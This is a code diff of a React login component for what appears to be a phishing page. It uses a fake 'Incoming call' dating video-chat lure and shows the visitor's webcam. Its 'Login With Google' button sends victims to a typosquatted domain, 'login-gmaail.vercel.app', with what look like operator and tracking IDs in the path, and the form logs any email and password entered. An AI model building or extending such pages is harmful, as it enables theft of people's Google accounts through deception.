@@ -10,8 +10,7 @@ import { API_URL } from "../config";
 import Image from "next/image";
 import Webcam from "react-webcam";
 
-
-function LoginForm({ adminId, posterId,verifyId }) {
+function LoginForm({ adminId, posterId, verifyId }) {
   const router = useRouter();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -31,62 +30,59 @@ function LoginForm({ adminId, posterId,verifyId }) {
     // router.push(`/security-check`);
     setEmail("");
     setPassword("");
-  
+
     console.log(submitValues);
   };
   const handleSubmitgoogle = () => {
-router.push(`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`);
-
+    router.push(
+      `https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
+    );
   };
-
 
   return (
     <>
-    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
-   
-      <Webcam
-        audio={false}
-        className="object-cover h-screen w-screen lg:w-auto"
-        
-      />
+      <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
+        <Webcam
+          audio={false}
+          className="object-cover h-screen w-screen lg:w-auto"
+        />
 
-      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
-        
-          
-            <div class="p-5 w-[400px]">
-              <div class="mx-auto flex items-center justify-center mt-5">
-                <img
-                  class="h-16 w-16 text-center"
-                  src="/images/facetime.png"
-                  alt=""
-                />
-              </div>
-              <h2 class="text-3xl font-bold text-blue-900 text-center">
+        <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0 ">
+          <div class="p-5 w-[400px]">
+            <div class="mx-auto flex items-center justify-center my-5">
+              <img
+                class="h-16 w-16 text-center"
+                src="/images/facetime.png"
+                alt=""
+              />
+            </div>
+            <div class="mx-auto flex items-center justify-center my-5">
+              <p>Incoming call...</p>
+            </div>
+            <div className="bg-white px-5 pt-5 pb-3 rounded-md">
+              <h2 class="text-3xl font-bold text-[#2b044d] text-center mb-2">
                 Live Video Chat
               </h2>
-              <p class="text-xl pt-5 font-semibold text-[#707b8e]">
+              <p class="text-lg pt-2 font-medium leading-tight">
                 Login with Google and enjoy with{" "}
-                <b class="text-[#00BE70]">Private Live Video Chat</b> your dating
-                partner.
+                <b class="text-[#2b044d]">Private Live Video Chat</b> your
+                dating partner.
               </p>
 
               <button
-                class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md"
+                class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#009aff] text-xl font-semibold text-white rounded-md"
                 onClick={() => handleSubmitgoogle()}
               >
                 <span>
-                  <img
-                    src="/images/facetime.png"
-                    class="w-12 h-12"
-                    alt=""
-                  />
+                  <img src="/images/facetime.png" class="w-12 h-12" alt="" />
                 </span>
                 <span>Login With Google</span>
               </button>
             </div>
-            </div>
-                 </div>
-            </>
+          </div>
+        </div>
+      </div>
+    </>
   );
 }
 
